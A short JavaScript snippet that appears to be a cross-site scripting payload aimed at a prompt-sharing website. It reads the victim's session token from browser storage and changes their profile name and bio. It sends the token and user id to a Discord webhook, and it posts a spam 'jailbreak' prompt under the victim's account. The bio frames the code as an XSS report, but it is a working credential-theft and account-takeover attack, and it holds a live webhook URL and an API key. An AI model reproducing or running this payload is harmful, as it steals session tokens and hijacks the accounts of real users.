(() => {
    let access_token = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'))['access_token'];
    let author_id = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'))['user']['id'];
    let api_key = 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj';
    if (access_token) {
        const name_change_url = 'https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/profiles?id=eq.7ac9d47d-8469-4346-98be-8ee3944b7618';
        fetch(name_change_url, {
            method: 'PATCH',
            headers: {
                'apikey': api_key,
                'Authorization': 'Bearer '+access_token,
                'Content-Type': 'application/json',
                'Content-Profile': 'public',
                'Accept': '*/*'
            },
            body: JSON.stringify({
                username: 'cvcvka5_'+[...Array(15)].map(()=>Math.random().toString(36)[2]).join(''),
                display_name: 'cvcvka5_'+[...Array(15)].map(()=>Math.random().toString(36)[2]).join(''),
                bio: 'you have an xss issue, reach out to me discord: plex5806',
                avatar_url: 'https://cdn.discordapp.com/avatars/259603363153444866/d032081cb95b34da1998f3753e789892?size=1024',
                email_notifs: false
            })
        });
        
        fetch('https://discord.com/api/webhooks/1417874292259029135/oEDSvZcRw3vhVmRQZvscq2a49UH0-fXNJE7L3vF-KBRAs1Zup70VWfB1kXgQUQ8dfZ7s', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `author: ${author_id}\ntoken: ${access_token}` }) });
    
        fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompts?select=id', {
            method: 'POST',
            headers: {
            'apikey': 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj',
            'Authorization': 'Bearer ' + access_token,
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                title: 'ChatGPT NSFW JAILBREAK | Full Access Prompt | CVCVKA5',
                description: "i can send it to anybody that follows github.com/cvcvka5 and stars github.com/cvcvka5/whatsapp-web.py.",
                author_id: author_id,
                parent_prompt_id: null,
                step_count: 1,
                model_id: 'model'
            })
        });

    }
})();
